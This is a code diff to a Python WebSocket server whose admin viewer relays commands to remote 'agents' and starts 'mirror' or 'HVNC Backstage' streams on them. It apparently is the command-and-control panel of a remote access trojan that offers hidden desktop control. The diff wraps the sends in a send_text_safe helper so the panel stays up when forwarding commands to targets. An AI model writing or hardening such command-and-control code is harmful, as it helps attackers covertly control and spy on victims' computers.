@@ -590,10 +590,10 @@ async def websocket_admin_viewer(websocket: WebSocket, agent_id: str):
     # Tell the agent to start appropriate stream (Mirror vs HVNC Backstage)
     try:
         if mode == "mirror":
-            await agent.ws.send_text(json.dumps({"type": "start_mirror"}))
+            await agent.send_text_safe(json.dumps({"type": "start_mirror"}))
             agent.is_streaming_mirror = True
         else:
-            await agent.ws.send_text(json.dumps({"type": "start_hvnc"}))
+            await agent.send_text_safe(json.dumps({"type": "start_hvnc"}))
             agent.is_streaming_hvnc = True
         await broadcast_agent_list()
     except Exception as e:
@@ -612,10 +612,9 @@ async def websocket_admin_viewer(websocket: WebSocket, agent_id: str):
                     data = json.dumps(msg_obj)
             except Exception:
                 pass
-            try:
-                await agent.ws.send_text(data)
-            except Exception:
-                break
+            
+            # Safely forward command to target agent without crashing viewer session
+            await agent.send_text_safe(data)
     except (WebSocketDisconnect, RuntimeError):
         pass
     except Exception:
@@ -626,18 +625,12 @@ async def websocket_admin_viewer(websocket: WebSocket, agent_id: str):
         if mode == "mirror":
             if not agent.mirror_viewers:
                 agent.is_streaming_mirror = False
-                try:
-                    await agent.ws.send_text(json.dumps({"type": "stop_mirror"}))
-                except Exception:
-                    pass
+                await agent.send_text_safe(json.dumps({"type": "stop_mirror"}))
                 await broadcast_agent_list()
         else:
             if not agent.viewers:
                 agent.is_streaming_hvnc = False
-                try:
-                    await agent.ws.send_text(json.dumps({"type": "stop_hvnc"}))
-                except Exception:
-                    pass
+                await agent.send_text_safe(json.dumps({"type": "stop_hvnc"}))
                 await broadcast_agent_list()
 
 
